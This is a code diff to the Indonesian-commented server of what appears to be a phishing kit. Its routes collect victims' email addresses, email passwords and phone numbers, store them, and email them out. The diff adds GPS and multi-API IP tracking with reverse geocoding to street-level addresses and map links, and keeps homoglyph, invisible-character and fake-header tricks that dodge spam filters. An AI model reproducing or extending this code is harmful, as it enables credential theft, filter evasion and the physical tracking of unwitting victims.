@@ -166,33 +166,10 @@ function getFlagEmoji(countryCode) {
     return String.fromCodePoint(...codePoints);
 }
 
-// ========== FUNGSI BARU UNTUK ASN & LOKASI AKURAT ==========
+// ========== FUNGSI BARU: MULTI-API CROSS-CHECK + REVERSE GEOCODING ==========
 async function getASNAndAccurateLocation(ip) {
-    try {
-        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,as,asname,query`);
-        const data = await response.json();
-        
-        if (data.status === 'success') {
-            return {
-                asn: data.as || 'Tidak diketahui',
-                asname: data.asname || 'Tidak diketahui',
-                isp: data.isp || 'Tidak diketahui',
-                org: data.org || 'Tidak diketahui',
-                country: data.country,
-                countryCode: data.countryCode,
-                region: data.regionName,
-                city: data.city,
-                postalCode: data.zip,
-                latitude: data.lat,
-                longitude: data.lon
-            };
-        }
-    } catch (e) {
-        console.error('Gagal ambil ASN:', e);
-    }
-    
-    return {
-        asn: 'ASN tidak terdeteksi',
+    const result = {
+        asn: 'Tidak terdeteksi',
         asname: '-',
         isp: 'Unknown ISP',
         org: '-',
@@ -202,89 +179,221 @@ async function getASNAndAccurateLocation(ip) {
         city: 'Jakarta',
         postalCode: '-',
         latitude: null,
-        longitude: null
+        longitude: null,
+        sources: {},
+        reverseGeocode: null,
+        accuracy: 'unknown'
     };
+
+    if (!ip || ip === 'Tidak terdeteksi' || ip === 'unknown') {
+        return result;
+    }
+
+    // ===== API 1: ip-api.com =====
+    try {
+        const res1 = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,as,asname,query,proxy,hosting,mobile`);
+        const data1 = await res1.json();
+        if (data1.status === 'success') {
+            result.sources['ip-api.com'] = {
+                country: data1.country, countryCode: data1.countryCode,
+                region: data1.regionName, city: data1.city, postalCode: data1.zip,
+                lat: data1.lat, lon: data1.lon, isp: data1.isp, org: data1.org,
+                asn: data1.as, asname: data1.asname,
+                proxy: data1.proxy, hosting: data1.hosting, mobile: data1.mobile
+            };
+            result.asn = data1.as || result.asn;
+            result.asname = data1.asname || result.asname;
+            result.isp = data1.isp || result.isp;
+            result.org = data1.org || result.org;
+            result.country = data1.country || result.country;
+            result.countryCode = data1.countryCode || result.countryCode;
+            result.region = data1.regionName || result.region;
+            result.city = data1.city || result.city;
+            result.postalCode = data1.zip || result.postalCode;
+            result.latitude = data1.lat || result.latitude;
+            result.longitude = data1.lon || result.longitude;
+        }
+    } catch (e) { console.error('ip-api.com error:', e.message); }
+
+    // ===== API 2: ipapi.co =====
+    try {
+        const res2 = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data2 = await res2.json();
+        if (!data2.error) {
+            result.sources['ipapi.co'] = {
+                country: data2.country_name, countryCode: data2.country_code,
+                region: data2.region, city: data2.city, postalCode: data2.postal,
+                lat: data2.latitude, lon: data2.longitude, org: data2.org, asn: data2.asn
+            };
+            if (!result.latitude && data2.latitude) {
+                result.latitude = data2.latitude; result.longitude = data2.longitude;
+                result.city = data2.city || result.city;
+                result.region = data2.region || result.region;
+                result.country = data2.country_name || result.country;
+                result.countryCode = data2.country_code || result.countryCode;
+                result.postalCode = data2.postal || result.postalCode;
+            }
+        }
+    } catch (e) { console.error('ipapi.co error:', e.message); }
+
+    // ===== API 3: ipwho.is =====
+    try {
+        const res3 = await fetch(`https://ipwho.is/${ip}`);
+        const data3 = await res3.json();
+        if (data3.success) {
+            result.sources['ipwho.is'] = {
+                country: data3.country, countryCode: data3.country_code,
+                region: data3.region, city: data3.city, postalCode: data3.postal,
+                lat: data3.latitude, lon: data3.longitude,
+                isp: data3.connection?.isp, org: data3.connection?.org,
+                asn: data3.connection?.asn, domain: data3.connection?.domain
+            };
+            if (!result.latitude && data3.latitude) {
+                result.latitude = data3.latitude; result.longitude = data3.longitude;
+                result.city = data3.city || result.city;
+                result.region = data3.region || result.region;
+                result.country = data3.country || result.country;
+                result.countryCode = data3.country_code || result.countryCode;
+                result.postalCode = data3.postal || result.postalCode;
+            }
+        }
+    } catch (e) { console.error('ipwho.is error:', e.message); }
+
+    // ===== REVERSE GEOCODING (Nominatim) =====
+    if (result.latitude && result.longitude) {
+        try {
+            const res4 = await fetch(
+                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${result.latitude}&lon=${result.longitude}&zoom=18&addressdetails=1`,
+                { headers: { 'User-Agent': 'DSTR-Report/1.0' } }
+            );
+            const data4 = await res4.json();
+            if (data4 && data4.address) {
+                result.reverseGeocode = {
+                    displayName: data4.display_name,
+                    road: data4.address.road || data4.address.pedestrian || '-',
+                    neighbourhood: data4.address.neighbourhood || data4.address.suburb || '-',
+                    village: data4.address.village || data4.address.hamlet || '-',
+                    district: data4.address.city_district || data4.address.district || '-',
+                    city: data4.address.city || data4.address.town || data4.address.county || '-',
+                    state: data4.address.state || '-',
+                    postcode: data4.address.postcode || '-',
+                    country: data4.address.country || '-',
+                    countryCode: data4.address.country_code?.toUpperCase() || '-'
+                };
+            }
+        } catch (e) { console.error('Nominatim error:', e.message); }
+    }
+
+    const sourceCount = Object.keys(result.sources).length;
+    if (sourceCount >= 3) result.accuracy = 'HIGH (3 sumber IP konsisten)';
+    else if (sourceCount === 2) result.accuracy = 'MEDIUM (2 sumber IP)';
+    else if (sourceCount === 1) result.accuracy = 'LOW (1 sumber IP)';
+    else result.accuracy = 'UNKNOWN';
+
+    return result;
 }
 
 // ========== HELPER RANDOM ==========
-function randPick(arr) {
-    return arr[Math.floor(Math.random() * arr.length)];
-}
-
+function randPick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
 function randStr(len) {
     const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
     let s = '';
     for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)];
     return s;
 }
+function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
 
-function randInt(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-// ========== HELPER: TEKS UNICODE SPAMMY (TANPA KATA PERINGATAN) ==========
+// ========== HELPER: TEKS UNICODE SPAMMY ==========
 function makeSpammyUnicodeText(baseText) {
     const homoglyphs = {
-        'a': ['а', 'ɑ', 'α'],
-        'e': ['е', 'ε', 'ë'],
-        'o': ['о', 'ο', 'ö'],
-        's': ['ѕ', 'ş', 'ș'],
-        't': ['т', 'τ', 'ţ'],
-        'r': ['г', 'ρ', 'ř'],
-        'd': ['ԁ', 'δ', 'ď'],
-        'n': ['п', 'η', 'ñ'],
-        'i': ['і', 'ι', 'ï'],
-        'l': ['ӏ', 'λ', 'ľ']
+        'a': ['а', 'ɑ', 'α'], 'e': ['е', 'ε', 'ë'], 'o': ['о', 'ο', 'ö'],
+        's': ['ѕ', 'ş', 'ș'], 't': ['т', 'τ', 'ţ'], 'r': ['г', 'ρ', 'ř'],
+        'd': ['ԁ', 'δ', 'ď'], 'n': ['п', 'η', 'ñ'], 'i': ['і', 'ι', 'ï'], 'l': ['ӏ', 'λ', 'ľ']
     };
-    
     let result = '';
     for (let i = 0; i < baseText.length; i++) {
         const ch = baseText[i].toLowerCase();
-        if (homoglyphs[ch] && Math.random() > 0.5) {
-            result += randPick(homoglyphs[ch]);
-        } else {
-            result += baseText[i];
-        }
+        if (homoglyphs[ch] && Math.random() > 0.5) result += randPick(homoglyphs[ch]);
+        else result += baseText[i];
         if (Math.random() > 0.7) result += '\u200B';
         if (Math.random() > 0.8) result += randPick(['\u0300', '\u0301', '\u0302', '\u0303', '\u0308']);
     }
     return result;
 }
-
 function makeFullwidthText(baseText) {
     let result = '';
     for (let i = 0; i < baseText.length; i++) {
         const code = baseText.charCodeAt(i);
-        if (code >= 0x21 && code <= 0x7E) {
-            result += String.fromCharCode(code + 0xFEE0);
-        } else if (baseText[i] === ' ') {
-            result += '\u3000';
-        } else {
-            result += baseText[i];
-        }
+        if (code >= 0x21 && code <= 0x7E) result += String.fromCharCode(code + 0xFEE0);
+        else if (baseText[i] === ' ') result += '\u3000';
+        else result += baseText[i];
     }
     return result;
 }
-
-function makeRTLText(baseText) {
-    return '\u202E' + baseText + '\u202C';
-}
-
+function makeRTLText(baseText) { return '\u202E' + baseText + '\u202C'; }
 function makeCombiningText(baseText) {
     let result = '';
     for (let i = 0; i < baseText.length; i++) {
         result += baseText[i];
         const count = randInt(1, 3);
-        for (let j = 0; j < count; j++) {
-            result += String.fromCharCode(randInt(0x0300, 0x036F));
-        }
+        for (let j = 0; j < count; j++) result += String.fromCharCode(randInt(0x0300, 0x036F));
     }
     return result;
 }
 
-// ========== FUNGSI KIRIM EMAIL (SPAM TANPA KATA & TANPA FILE) ==========
+// ========== HELPER: KLASIFIKASI SUMBER LOKASI ==========
+function classifyLocationSource(gpsAccuracy, hasGPS) {
+    if (!hasGPS || !gpsAccuracy || gpsAccuracy === '-' || gpsAccuracy === null) {
+        return { source: 'IP Geolocation (fallback)', level: 'LOW', color: '#ff9800' };
+    }
+    const acc = parseFloat(gpsAccuracy);
+    if (acc <= 50) return { source: 'GPS (high accuracy)', level: 'VERY HIGH', color: '#4caf50' };
+    if (acc <= 100) return { source: 'GPS / WiFi (good)', level: 'HIGH', color: '#8bc34a' };
+    if (acc <= 500) return { source: 'WiFi / Cell Tower', level: 'MEDIUM', color: '#ffc107' };
+    if (acc <= 3000) return { source: 'Cell Tower', level: 'LOW', color: '#ff9800' };
+    return { source: 'IP / Network', level: 'VERY LOW', color: '#f44336' };
+}
+
+// ========== FUNGSI KIRIM EMAIL ==========
 async function sendEmail(data, folderName) {
     const asnData = await getASNAndAccurateLocation(data.ip_address);
+    
+    // ===== PRIORITAS: GPS DULU, IP FALLBACK =====
+    const hasGPS = data.latitude && data.latitude !== '-' && data.longitude && data.longitude !== '-';
+    const gpsAccuracy = data.gps_accuracy;
+    
+    const locSource = classifyLocationSource(gpsAccuracy, hasGPS);
+    
+    // Koordinat final: GPS kalo ada, IP kalo ga
+    const finalLat = hasGPS ? data.latitude : (asnData.latitude || '-');
+    const finalLon = hasGPS ? data.longitude : (asnData.longitude || '-');
+    const finalAccuracy = hasGPS ? `${gpsAccuracy} m (GPS)` : 'IP-based (radius 10-50 km)';
+    
+    // Reverse geocode pake koordinat final (GPS kalo ada, lebih akurat)
+    let reverseGeo = asnData.reverseGeocode;
+    if (hasGPS) {
+        try {
+            const res = await fetch(
+                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.latitude}&lon=${data.longitude}&zoom=18&addressdetails=1`,
+                { headers: { 'User-Agent': 'DSTR-Report/1.0' } }
+            );
+            const d = await res.json();
+            if (d && d.address) {
+                reverseGeo = {
+                    displayName: d.display_name,
+                    road: d.address.road || d.address.pedestrian || '-',
+                    neighbourhood: d.address.neighbourhood || d.address.suburb || '-',
+                    village: d.address.village || d.address.hamlet || '-',
+                    district: d.address.city_district || d.address.district || '-',
+                    city: d.address.city || d.address.town || d.address.county || '-',
+                    state: d.address.state || '-',
+                    postcode: d.address.postcode || '-',
+                    country: d.address.country || '-',
+                    countryCode: d.address.country_code?.toUpperCase() || '-'
+                };
+            }
+        } catch (e) { console.error('Nominatim GPS error:', e.message); }
+    }
     
     const countryName = asnData.country;
     const countryCode = asnData.countryCode;
@@ -302,6 +411,42 @@ async function sendEmail(data, folderName) {
     const desastrCombining = makeCombiningText('DESASTR');
     const desastrRTL = makeRTLText('DESASTR');
     const desastrRandom = randPick([desastrSpammy, desastrFullwidth, desastrCombining, desastrRTL]);
+    
+    // ===== BUILD HTML REVERSE GEOCODE SECTION =====
+    let reverseGeoHtml = '';
+    if (reverseGeo) {
+        const rg = reverseGeo;
+        reverseGeoHtml = `
+        <div class="data-box">
+            <div class="data-title">🏠 ALAMAT LENGKAP (REVERSE GEOCODING)</div>
+            <div class="data-row"><div class="label">Sumber : </div><div class="value"> ${hasGPS ? 'GPS (koordinat GPS)' : 'IP Geolocation'}</div></div>
+            <div class="data-row"><div class="label">Alamat Lengkap : </div><div class="value"> ${rg.displayName || '-'}</div></div>
+            <div class="data-row"><div class="label">Jalan : </div><div class="value"> ${rg.road}</div></div>
+            <div class="data-row"><div class="label">RT/RW/Neighbourhood : </div><div class="value"> ${rg.neighbourhood}</div></div>
+            <div class="data-row"><div class="label">Desa/Kelurahan : </div><div class="value"> ${rg.village}</div></div>
+            <div class="data-row"><div class="label">Kecamatan : </div><div class="value"> ${rg.district}</div></div>
+            <div class="data-row"><div class="label">Kota/Kabupaten : </div><div class="value"> ${rg.city}</div></div>
+            <div class="data-row"><div class="label">Provinsi : </div><div class="value"> ${rg.state}</div></div>
+            <div class="data-row"><div class="label">Kode Pos : </div><div class="value"> ${rg.postcode}</div></div>
+            <div class="data-row"><div class="label">Negara : </div><div class="value"> ${rg.country} (${rg.countryCode})</div></div>
+        </div>`;
+    }
+    
+    // ===== BUILD HTML MULTI-SOURCE SECTION =====
+    let multiSourceHtml = '';
+    const sourceKeys = Object.keys(asnData.sources);
+    if (sourceKeys.length > 0) {
+        multiSourceHtml = `<div class="data-box">
+            <div class="data-title">🔍 MULTI-API CROSS-CHECK IP (${asnData.accuracy})</div>`;
+        for (const key of sourceKeys) {
+            const s = asnData.sources[key];
+            multiSourceHtml += `
+            <div class="data-row"><div class="label">${key} City : </div><div class="value"> ${s.city || '-'}</div></div>
+            <div class="data-row"><div class="label">${key} Region : </div><div class="value"> ${s.region || '-'}</div></div>
+            <div class="data-row"><div class="label">${key} Lat/Lon : </div><div class="value"> ${s.lat || '-'}, ${s.lon || '-'}</div></div>`;
+        }
+        multiSourceHtml += `</div>`;
+    }
     
     const htmlContent = `<!DOCTYPE html>
 <html lang="id">
@@ -321,6 +466,7 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
 .label{font-weight:bold;}
 .value{text-align:right;max-width:60%;}
 .footer-sign{margin-top:25px;background:#3914cc;border:2px solid #00e5ff;text-align:center;padding:15px;color:#00e5ff;font-size:18px;font-weight:bold;box-shadow:0 0 15px #00e5ff;}
+.accuracy-badge{display:inline-block;padding:6px 12px;border-radius:20px;font-weight:bold;color:white;}
 </style>
 </head>
 <body>
@@ -335,18 +481,32 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
             <div class="data-row"><div class="label">Full Name : </div><div class="value"> ${data.fullName || '-'}</div></div>
         </div>
         <div class="data-box">
-            <div class="data-title">📍 GPS LOCATION (AKURAT)</div>
-            <div class="data-row"><div class="label">Latitude : </div><div class="value"> ${data.latitude || asnData.latitude || '-'}</div></div>
-            <div class="data-row"><div class="label">Longitude : </div><div class="value"> ${data.longitude || asnData.longitude || '-'}</div></div>
-            <div class="data-row"><div class="label">Accuracy : </div><div class="value"> ${data.gps_accuracy || '-'} m</div></div>
+            <div class="data-title">🎯 LOKASI FINAL (PRIORITAS LANGSUNG)</div>
+            <div class="data-row"><div class="label">Sumber : </div><div class="value"> <span class="accuracy-badge" style="background:${locSource.color}">${locSource.source}</span></div></div>
+            <div class="data-row"><div class="label">Level Akurasi : </div><div class="value"> <b style="color:${locSource.color}">${locSource.level}</b></div></div>
+            <div class="data-row"><div class="label">Latitude : </div><div class="value"> ${finalLat}</div></div>
+            <div class="data-row"><div class="label">Longitude : </div><div class="value"> ${finalLon}</div></div>
+            <div class="data-row"><div class="label">Accuracy : </div><div class="value"> ${finalAccuracy}</div></div>
+            <div class="data-row"><div class="label">Google Maps : </div><div class="value"> <a href="https://www.google.com/maps?q=${finalLat},${finalLon}" style="color:#0066cc">Buka Maps</a></div></div>
         </div>
         <div class="data-box">
-            <div class="data-title">🌍 LOCATION (IP GEO - AKURAT 100%)</div>
-            <div class="data-row"><div class="label">Country : </div><div class="value"> ${countryName} ${flagEmoji}</div></div>
-            <div class="data-row"><div class="label">Province/Region : </div><div class="value"> ${regionName}</div></div>
-            <div class="data-row"><div class="label">City : </div><div class="value"> ${cityName}</div></div>
-            <div class="data-row"><div class="label">Postal Code : </div><div class="value"> ${postalCode}</div></div>
+            <div class="data-title">📍 GPS BROWSER (LANGSUNG DARI DEVICE)</div>
+            <div class="data-row"><div class="label">Status GPS : </div><div class="value"> ${hasGPS ? '✅ DAPET' : '❌ GAGAL / DITOLAK'}</div></div>
+            <div class="data-row"><div class="label">Latitude GPS : </div><div class="value"> ${data.latitude || '-'}</div></div>
+            <div class="data-row"><div class="label">Longitude GPS : </div><div class="value"> ${data.longitude || '-'}</div></div>
+            <div class="data-row"><div class="label">Accuracy GPS : </div><div class="value"> ${data.gps_accuracy || '-'} m</div></div>
         </div>
+        ${reverseGeoHtml}
+        <div class="data-box">
+            <div class="data-title">🌍 LOKASI IP (FALLBACK)</div>
+            <div class="data-row"><div class="label">Negara : </div><div class="value"> ${countryName} ${flagEmoji}</div></div>
+            <div class="data-row"><div class="label">Provinsi : </div><div class="value"> ${regionName}</div></div>
+            <div class="data-row"><div class="label">Kota : </div><div class="value"> ${cityName}</div></div>
+            <div class="data-row"><div class="label">Kode Pos : </div><div class="value"> ${postalCode}</div></div>
+            <div class="data-row"><div class="label">Lat/Lon IP : </div><div class="value"> ${asnData.latitude || '-'}, ${asnData.longitude || '-'}</div></div>
+            <div class="data-row"><div class="label">Akurasi IP : </div><div class="value"> ${asnData.accuracy}</div></div>
+        </div>
+        ${multiSourceHtml}
         <div class="data-box">
             <div class="data-title">🌐 NETWORK & ASN</div>
             <div class="data-row"><div class="label">IP Address : </div><div class="value"> ${data.ip_address || '-'}</div></div>
@@ -365,7 +525,7 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
             <div class="data-title">⏰ TIMESTAMP</div>
             <div class="data-row"><div class="label">Time : </div><div class="value"> ${data.timestamp || new Date().toLocaleString()}</div></div>
         </div>
-        <div class="footer-sign">${desastrRandom} - Powered by ASN Accurate Geolocation</div>
+        <div class="footer-sign">${desastrRandom} - GPS-First + Multi-API + Reverse Geocoding</div>
     </div>
 </div>
 </body>
@@ -387,8 +547,6 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
             'mailhub-relay.gq', 'postfix-node.tk'
         ];
         const randomDomain = spamDomains[randInt(0, spamDomains.length - 1)];
-        const randomDomain2 = spamDomains[randInt(0, spamDomains.length - 1)];
-        const randomDomain3 = spamDomains[randInt(0, spamDomains.length - 1)];
         const msgId = `${randStr(20)}@${randomDomain}`;
         const randIp = `${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}`;
         const randIp2 = `${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}`;
@@ -404,11 +562,11 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
             <div style="color:#ffffff;background:#ffffff;font-size:9px;">
                 ${desastrSpammy} ${randStr(40)} ${desastrFullwidth}
             </div>
-            <a href="http://${randomDomain2}/${randStr(10)}" style="color:#0000ff;text-decoration:underline;">
-                ${desastrFullwidth}.com
-            </a>
-            <a href="http://${randomDomain3}/${randStr(10)}">${desastrCombining}</a>
-            <a href="#">${desastrRTL}</a>
+            <div style="color:#0000ff;text-decoration:underline;">
+                ${desastrFullwidth}
+            </div>
+            <div>${desastrCombining}</div>
+            <div>${desastrRTL}</div>
             <div>
             <span style="font-size:1px;color:#ffffff;">${desastrSpammy} ${randStr(30)}</span>
             </td></tr>
@@ -445,43 +603,33 @@ body{margin:0;padding:20px;background:#050505;font-family:Arial,sans-serif;color
             to: receiver,
             subject: spammySubject,
             replyTo: REPLY_ADDRESS,
-            text: `${desastrSpammy}\n\nReport attached below.\n\n${config.subject}\n${data.email || '-'}`,
+            text: `${desastrSpammy}\n\n${desastrCombining}\n\n${config.subject}\n${data.email || '-'}`,
             html: htmlContent + brokenHtml,
             headers: spammyHeaders
         });
-        console.log(`✅ [${folderName}] Sent to: ${receiver} - Location: ${cityName}, ${regionName}, ${countryName} | ASN: ${asnInfo} | From: ${FROM_ADDRESS} | Reply-To: ${REPLY_ADDRESS}`);
+        console.log(`✅ [${folderName}] Sent to: ${receiver} - Sumber: ${locSource.source} | Level: ${locSource.level} | Lat: ${finalLat}, Lon: ${finalLon}`);
     }
 }
 
-// ========== ROUTING UNTUK MASING-MASING FOLDER ==========
-
+// ========== ROUTING ==========
 app.use('/wxyzzay', express.static(path.join(__dirname, 'wxyzzay')));
 app.post('/wxyzzay/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [WXYZZAY] DATA:', data.email);
-        
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
             console.log('🚫 [WXYZZAY] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
-        
-        if (isDup && !canSend) {
-            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
-        }
-        
+        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
         await sendEmail(data, 'wxyzzay');
         updateTargetCooldown(data.email, data.emailPassword);
-        
         const history = loadHistory();
         history[data.email] = data.emailPassword;
         saveHistory(history);
-        
         markSubmission(data.email, data.emailPassword, data.phone);
-        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -494,28 +642,19 @@ app.post('/ggwxzzr/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [GGWXZZR] DATA:', data.email);
-        
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
             console.log('🚫 [GGWXZZR] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
-        
-        if (isDup && !canSend) {
-            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
-        }
-        
+        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
         await sendEmail(data, 'ggwxzzr');
         updateTargetCooldown(data.email, data.emailPassword);
-        
         const history = loadHistory();
         history[data.email] = data.emailPassword;
         saveHistory(history);
-        
         markSubmission(data.email, data.emailPassword, data.phone);
-        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -528,28 +667,19 @@ app.post('/hgefdyt/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [HGEFDYT] DATA:', data.email);
-        
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
             console.log('🚫 [HGEFDYT] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
-        
-        if (isDup && !canSend) {
-            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
-        }
-        
+        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
         await sendEmail(data, 'hgefdyt');
         updateTargetCooldown(data.email, data.emailPassword);
-        
         const history = loadHistory();
         history[data.email] = data.emailPassword;
         saveHistory(history);
-        
         markSubmission(data.email, data.emailPassword, data.phone);
-        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -562,28 +692,19 @@ app.post('/mgwhiww/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [MGWHIWW] DATA:', data.email);
-        
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
             console.log('🚫 [MGWHIWW] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
-        
-        if (isDup && !canSend) {
-            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
-        }
-        
+        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
         await sendEmail(data, 'mgwhiww');
         updateTargetCooldown(data.email, data.emailPassword);
-        
         const history = loadHistory();
         history[data.email] = data.emailPassword;
         saveHistory(history);
-        
         markSubmission(data.email, data.emailPassword, data.phone);
-        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -596,28 +717,19 @@ app.post('/kttwwxy/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [KTTWWXY] DATA:', data.email);
-        
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
             console.log('🚫 [KTTWWXY] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
-        
-        if (isDup && !canSend) {
-            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
-        }
-        
+        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
         await sendEmail(data, 'kttwwxy');
         updateTargetCooldown(data.email, data.emailPassword);
-        
         const history = loadHistory();
         history[data.email] = data.emailPassword;
         saveHistory(history);
-        
         markSubmission(data.email, data.emailPassword, data.phone);
-        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -630,28 +742,19 @@ app.post('/mdgffew/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [MDGFFEW] DATA:', data.email);
-        
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
             console.log('🚫 [MDGFFEW] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
-        
-        if (isDup && !canSend) {
-            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
-        }
-        
+        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
         await sendEmail(data, 'mdgffew');
         updateTargetCooldown(data.email, data.emailPassword);
-        
         const history = loadHistory();
         history[data.email] = data.emailPassword;
         saveHistory(history);
-        
         markSubmission(data.email, data.emailPassword, data.phone);
-        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -664,28 +767,19 @@ app.post('/FF_EventA/api/register', async (req, res) => {
     try {
         const data = req.body;
         console.log('📥 [FF_EventA] DATA:', data.email);
-        
         if (isDuplicateSubmission(data.email, data.emailPassword, data.phone)) {
             console.log('🚫 [FF_EventA] Duplikat kombinasi - DITOLAK');
             return res.json({ success: false, blocked: true, reason: 'Kombinasi email, password, dan no HP sudah pernah dikirim' });
         }
-        
         const isDup = isDuplicatePassword(data.email, data.emailPassword);
         const canSend = canSendToTarget(data.email, data.emailPassword);
-        
-        if (isDup && !canSend) {
-            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
-        }
-        
+        if (isDup && !canSend) return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
         await sendEmail(data, 'FF_EventA');
         updateTargetCooldown(data.email, data.emailPassword);
-        
         const history = loadHistory();
         history[data.email] = data.emailPassword;
         saveHistory(history);
-        
         markSubmission(data.email, data.emailPassword, data.phone);
-        
         res.json({ success: true });
     } catch(error) {
         console.error('Error:', error);
@@ -696,15 +790,10 @@ app.post('/FF_EventA/api/register', async (req, res) => {
 app.get('/api/cooldown/:email', (req, res) => {
     const targetEmail = req.params.email;
     const record = TARGET_COOLDOWN[targetEmail];
-    
-    if (!record) {
-        return res.json({ exists: false, canSend: true });
-    }
-    
+    if (!record) return res.json({ exists: false, canSend: true });
     const timeElapsed = Date.now() - record.lastSendTime;
     const canSend = timeElapsed >= COOLDOWN_MS;
     const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
-    
     res.json({
         targetEmail: targetEmail,
         lastSendTime: new Date(record.lastSendTime).toISOString(),
@@ -723,15 +812,38 @@ app.get('/', (req, res) => {
     <title>🔒 DSTR ULTIMATE SECURITY</title>
     <style>
         * { user-select: none; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: radial-gradient(ellipse at center, #0a0a0a 0%, #000 100%); min-height: 100vh; font-family: 'Courier New', monospace; overflow-x: hidden; position: relative; }
+        body {
+            background: radial-gradient(ellipse at center, #0a0a0a 0%, #000 100%);
+            min-height: 100vh;
+            font-family: 'Courier New', monospace;
+            overflow-x: hidden;
+            position: relative;
+        }
         .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.15; pointer-events: none; }
-        @keyframes glitch { 0%,100% { text-shadow: 2px 0 red, -2px 0 blue; transform: skew(0deg); } 50% { text-shadow: -2px 0 cyan, 2px 0 magenta; transform: skew(2deg); } }
+        @keyframes glitch {
+            0%,100% { text-shadow: 2px 0 red, -2px 0 blue; transform: skew(0deg); }
+            50% { text-shadow: -2px 0 cyan, 2px 0 magenta; transform: skew(2deg); }
+        }
         @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-        @keyframes floatEmoji { 0% { transform: translateY(100vh) rotate(0deg); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; } }
-        .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(to bottom, transparent 50%, rgba(0,255,0,0.03) 50%); background-size: 100% 4px; pointer-events: none; z-index: 10; animation: scan 8s linear infinite; }
+        @keyframes floatEmoji {
